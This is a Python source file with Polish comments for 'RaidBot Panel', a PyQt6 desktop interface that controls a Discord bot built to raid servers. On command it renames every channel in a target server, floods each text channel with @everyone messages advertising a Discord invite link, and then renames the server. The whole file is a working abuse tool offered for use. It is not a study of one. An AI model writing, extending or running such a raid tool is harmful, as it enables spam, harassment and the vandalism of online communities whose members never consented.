import sys
import asyncio
import discord
from discord.ext import commands
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QListWidget, QTextEdit, QLineEdit, QPushButton, QWidget, QVBoxLayout, QHBoxLayout, QLabel
)
from PyQt6.QtCore import QTimer

# Przechowuje statusy serwerów
server_status = {}

# Domyślne ustawienia
default_channel_name = "cobra-core"
default_message = "@everyone FAJNY SERWER https://discord.gg/uMJhjhKVy4"
default_token = ""  # Pusty domyślny token
default_message_count = 10  # Domyślna liczba wysyłanych wiadomości
default_new_server_name = "Nowa-Nazwa-Serwera"  # Domyślna nowa nazwa serwera

# Inicjalizacja bota
intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

class RaidBotGUI(QMainWindow):
    def __init__(self, bot_instance):
        super().__init__()
        self.bot = bot_instance  # Przechowujemy instancję bota
        self.setWindowTitle("RaidBot Panel - by Trawka246")
        self.setGeometry(100, 100, 900, 500)

        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        layout = QHBoxLayout()
        main_widget.setLayout(layout)

        # Kolumna 1: Lista serwerów z ich statusami
        left_layout = QVBoxLayout()
        self.server_list = QListWidget()
        left_layout.addWidget(self.server_list)
        layout.addLayout(left_layout, 1)

        # Kolumna 2: Konsola (logi)
        middle_layout = QVBoxLayout()
        self.console = QTextEdit()
        self.console.setReadOnly(True)
        middle_layout.addWidget(self.console)

        # Komenda
        self.command_input = QLineEdit()
        self.command_input.setPlaceholderText("raid Nazwa Serwera")
        middle_layout.addWidget(self.command_input)

        self.run_button = QPushButton("Wykonaj")
        self.run_button.clicked.connect(self.handle_command)
        middle_layout.addWidget(self.run_button)

        layout.addLayout(middle_layout, 2)

        # Kolumna 3: Ustawienia
        right_layout = QVBoxLayout()

        # Pole tekstowe do wpisania nazwy kanału
        self.channel_name_input = QLineEdit(default_channel_name)
        self.channel_name_input.setPlaceholderText("Nazwa kanału")
        right_layout.addWidget(self.channel_name_input)

        # Pole tekstowe do wpisania wiadomości
        self.message_input = QLineEdit(default_message)
        self.message_input.setPlaceholderText("Wiadomość")
        right_layout.addWidget(self.message_input)

        # Pole do wpisania liczby wiadomości
        self.message_count_input = QLineEdit(str(default_message_count))
        self.message_count_input.setPlaceholderText("Liczba wiadomości")
        right_layout.addWidget(self.message_count_input)

        # Pole do wpisania nowej nazwy serwera
        self.new_server_name_input = QLineEdit(default_new_server_name)
        self.new_server_name_input.setPlaceholderText("Nowa nazwa serwera")
        right_layout.addWidget(self.new_server_name_input)

        # Pole do wpisania tokenu bota
        self.token_input = QLineEdit(default_token)
        self.token_input.setPlaceholderText("Token Bota")
        self.token_input.setEchoMode(QLineEdit.EchoMode.Password)  # Ukrywa tekst, wyświetla kropki
        right_layout.addWidget(self.token_input)

        # Przycisk do uruchomienia bota
        self.run_bot_button = QPushButton("Run")
        self.run_bot_button.setEnabled(False)  # Domyślnie wyłączony
        self.run_bot_button.clicked.connect(self.run_bot)
        right_layout.addWidget(self.run_bot_button)

        # Przycisk do zapisania ustawień
        self.save_button = QPushButton("Zapisz Ustawienia")
        self.save_button.clicked.connect(self.save_settings)
        right_layout.addWidget(self.save_button)

        layout.addLayout(right_layout, 1)

        # Timer do odświeżania listy serwerów
        self.timer = QTimer()
        self.timer.timeout.connect(self.refresh_server_list)
        self.timer.start(2000)

        # Sprawdzanie, czy token został wpisany
        self.token_input.textChanged.connect(self.check_token)

    def check_token(self):
        # Jeśli token jest wpisany, włącz przycisk Run
        if self.token_input.text():
            self.run_bot_button.setEnabled(True)
        else:
            self.run_bot_button.setEnabled(False)

    def refresh_server_list(self):
        self.server_list.clear()
        for guild in self.bot.guilds:
            status = server_status.get(guild.id, "normalny 🟢")
            self.server_list.addItem(f"{guild.name} – {status}")

    def log(self, text):
        self.console.append(text)

    def handle_command(self):
        command = self.command_input.text().strip()
        if command.lower().startswith("raid "):
            server_name = self.command_input.text()[5:].strip()  # Pobieramy tylko nazwę serwera po "raid "
            if not server_name:
                self.log("❌ Proszę podać nazwę serwera!")
                return

            for guild in self.bot.guilds:
                if guild.name.lower() == server_name.lower():
                    self.log(f"▶️ Rozpoczynanie RAID na {guild.name}")
                    server_status[guild.id] = "raidowany 🟠"
                    asyncio.create_task(self.raid_guild(guild))
                    break
            else:
                self.log(f"❌ Nie znaleziono serwera: {server_name}")
        else:
            self.log(f"❌ Nieznana komenda: {command}")
        self.command_input.clear()

    def save_settings(self):
        global default_channel_name, default_message, default_token, default_message_count, default_new_server_name
        default_channel_name = self.channel_name_input.text()
        default_message = self.message_input.text()
        default_token = self.token_input.text()
        default_new_server_name = self.new_server_name_input.text()
        try:
            default_message_count = int(self.message_count_input.text())
        except ValueError:
            self.log("❌ Liczba wiadomości musi być liczbą całkowitą!")
            return
        self.log("✅ Ustawienia zostały zapisane!")

    def run_bot(self):
        token = self.token_input.text().strip()
        if token:
            self.log("🔓 Uruchamianie bota...")
            self.run_bot_button.setEnabled(False)  # Wyłącz przycisk po kliknięciu
            self.token_input.setEnabled(False)  # Wyłącz pole tekstowe z tokenem
            asyncio.create_task(self.start_bot(token))
        else:
            self.log("❌ Brak tokena bota!")

    async def start_bot(self, token):
        try:
            await bot.start(token)
        except Exception as e:
            self.log(f"❌ Błąd przy uruchamianiu bota: {e}")

    async def raid_guild(self, guild):
        tasks = []
        for channel in guild.channels:
            tasks.append(handle_channel(channel, self))
        await asyncio.gather(*tasks)

        # Zmieniamy nazwę serwera na nową po zakończeniu rajdu
        await guild.edit(name=default_new_server_name)
        self.log(f"✅ RAID na {guild.name} zakończony i zmieniono nazwę na {default_new_server_name}!")
        server_status[guild.id] = "zrajdowany 🔴"

# Funkcja raidowania
async def handle_channel(channel, gui=None):
    try:
        # Zmieniamy nazwę kanału na ustawioną w interfejsie
        await channel.edit(name=default_channel_name)
        if gui:
            gui.log(f"🔧 Zmieniono nazwę kanału: {channel.name}")

        if isinstance(channel, discord.TextChannel):
            for _ in range(default_message_count):
                await channel.send(
                    default_message,
                    allowed_mentions=discord.AllowedMentions(everyone=True)
                )
                await asyncio.sleep(0)
            if gui:
                gui.log(f"📢 Spam wysłany do: {channel.name}")
    except Exception as e:
        if gui:
            gui.log(f"❌ Błąd przy {channel.name}: {e}")

# Uruchamianie Discorda + GUI
async def main():
    app = QApplication(sys.argv)
    window = RaidBotGUI(bot)
    window.show()

    async def start_bot():
        global default_token
        if default_token:
            await bot.start(default_token)
        else:
            window.log("❌ Brak tokena bota!")

    loop = asyncio.get_running_loop()
    loop.create_task(start_bot())

    while True:
        await asyncio.sleep(0.01)
        app.processEvents()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Zamykam bota...")
